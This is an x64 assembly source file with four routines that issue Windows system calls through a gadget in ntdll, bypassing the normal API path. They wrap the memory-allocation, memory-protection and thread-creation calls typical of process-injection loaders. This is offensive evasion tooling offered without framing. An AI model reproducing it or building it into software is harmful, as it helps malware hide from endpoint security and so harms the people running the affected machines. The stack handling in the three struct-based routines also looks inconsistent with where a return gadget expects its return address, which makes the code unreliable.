; x64 indirect control transfer to ntdll gadget
; Microsoft x64 ABI: RCX=ssn, RDX=gadget, R8=args struct pointer

[BITS 64]
SECTION .text

GLOBAL AxIndirectSyscall2
GLOBAL AxIndirectNtProtectFromArgs
GLOBAL AxIndirectNtAllocFromArgs
GLOBAL AxIndirectNtCreateThreadExFromArgs

; NTSTATUS AxIndirectSyscall2(ULONG ssn, PVOID gadget, ULONG_PTR ntArg1, ULONG_PTR ntArg2);
AxIndirectSyscall2:
	lea r11, [rel .Lret2]
	push r11
	mov r11, rdx
	mov r10, r8
	mov rdx, r9
	mov eax, ecx
	jmp r11
.Lret2:
	ret

; NTSTATUS AxIndirectNtProtectFromArgs(ULONG ssn, PVOID gadget, INDIRECT_NT_PROTECT_ARGS* a);
; 0=ProcessHandle, 8=BaseAddress*, 16=RegionSize*, 24=NewProtect, 28=pad, 32=OldProtect*
AxIndirectNtProtectFromArgs:
	push r12
	mov r12, r8
	mov r11, rdx
	mov eax, ecx
	mov r10, [r12]
	mov rdx, [r12+8]
	mov r8, [r12+16]
	mov r9d, [r12+24]
	mov rcx, [r12+32]
	lea rax, [rel .LretP]
	push rax
	sub rsp, 20h
	mov [rsp+28h], rcx
	jmp r11
.LretP:
	add rsp, 20h
	pop r12
	ret

; NTSTATUS AxIndirectNtAllocFromArgs(ULONG ssn, PVOID gadget, INDIRECT_NT_ALLOC_ARGS* a);
; 0=ProcessHandle, 8=BaseAddress*, 16=ZeroBits, 24=RegionSize*, 32=AllocationType, 36=Protect
AxIndirectNtAllocFromArgs:
	push r12
	mov r12, r8
	mov r11, rdx
	mov eax, ecx
	mov r10, [r12]
	mov rdx, [r12+8]
	mov r8, [r12+16]
	mov r9, [r12+24]
	lea rax, [rel .LretA]
	push rax
	sub rsp, 20h
	mov rcx, [r12+32]
	mov [rsp+28h], rcx
	mov rcx, [r12+36]
	mov [rsp+30h], rcx
	jmp r11
.LretA:
	add rsp, 20h
	pop r12
	ret

; NTSTATUS AxIndirectNtCreateThreadExFromArgs(ULONG ssn, PVOID gadget, INDIRECT_NT_CREATETHREADEX_ARGS* a);
; 11 args: r10,rdx,r8,r9 then stack 5..11 at rsp+28 .. rsp+58
; Offsets: 0 PHANDLE, 8 DesiredAccess, 16 ObjectAttributes, 24 ProcessHandle, 32 StartRoutine,
;          40 Argument, 48 CreateFlags, 56 ZeroBits, 64 StackCommit, 72 StackReserve, 80 AttributeList
AxIndirectNtCreateThreadExFromArgs:
	push r12
	mov r12, r8
	mov r11, rdx
	mov eax, ecx
	mov r10, [r12]
	mov rdx, [r12+8]
	mov r8, [r12+10h]
	mov r9, [r12+18h]
	lea rax, [rel .LretC]
	push rax
	sub rsp, 20h
	mov rcx, [r12+20h]
	mov [rsp+28h], rcx
	mov rcx, [r12+28h]
	mov [rsp+30h], rcx
	mov rcx, [r12+30h]
	mov [rsp+38h], rcx
	mov rcx, [r12+38h]
	mov [rsp+40h], rcx
	mov rcx, [r12+40h]
	mov [rsp+48h], rcx
	mov rcx, [r12+48h]
	mov [rsp+50h], rcx
	mov rcx, [r12+50h]
	mov [rsp+58h], rcx
	jmp r11
.LretC:
	add rsp, 20h
	pop r12
	ret
